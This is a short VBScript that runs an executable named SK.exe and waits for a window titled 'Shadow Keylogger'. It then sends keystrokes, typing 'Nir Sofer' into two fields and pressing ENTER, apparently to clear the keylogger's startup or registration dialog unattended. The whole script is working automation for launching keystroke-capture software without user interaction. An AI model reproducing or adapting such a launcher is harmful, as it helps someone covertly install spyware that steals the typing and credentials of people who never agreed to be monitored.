Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "SK.exe"
Do Until Success = True
    Success = objShell.AppActivate("Shadow Keylogger")
    Wscript.Sleep 300
Loop
objShell.SendKeys "Nir Sofer"
objShell.SendKeys "{TAB}"
objShell.SendKeys "Nir Sofer"
objShell.SendKeys "{ENTER}"
